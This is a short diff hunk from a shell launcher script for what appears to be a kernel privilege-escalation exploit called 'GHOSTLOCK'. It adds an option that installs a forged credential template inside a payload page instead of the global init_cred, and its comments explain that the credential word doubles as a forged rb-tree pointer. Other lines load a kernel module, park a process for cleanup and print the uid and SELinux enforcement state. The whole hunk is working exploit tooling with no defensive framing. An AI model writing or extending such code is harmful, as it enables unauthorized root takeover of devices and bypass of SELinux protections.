@@ -34,8 +34,16 @@ export GHOSTLOCK_LOAD_KO="$KO"        # finit_module from *this* process
 export GHOSTLOCK_PARK_CMD="$PARK_CMD" # run after cleanup, before the process dies
 export GHOSTLOCK_FINISH=1            # the parked process runs cleanup-parked.sh --apply itself
                                      # (one cleanup implementation; it kills us only after verify)
+# GHOSTLOCK_CRED_FROM_COPY=1 installs the credential template inside the payload
+# page instead of the global init_cred, which keeps the collateral store (the
+# credential word doubles as the forged rb-tree child pointer) out of init_cred
+# and removes the extra repair route.  Needs the w1c-cred-copy build; off by
+# default until it has been proven on hardware, because a wrong security/user_ns
+# pointer in the template turns every SELinux-checked syscall into -EINVAL.
+#export GHOSTLOCK_CRED_FROM_COPY=1
 
 echo "W1c: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)"
+echo "W1c: cred_from_copy=${GHOSTLOCK_CRED_FROM_COPY:-0} (0 = global init_cred)"
 echo "W1c: pre=$PRE_CMD"
 echo "W1c: ko=$KO park=$PARK_CMD"
 [ -f "$KO" ] || echo "W1c: WARNING $KO missing -- LOAD_KO will fail"
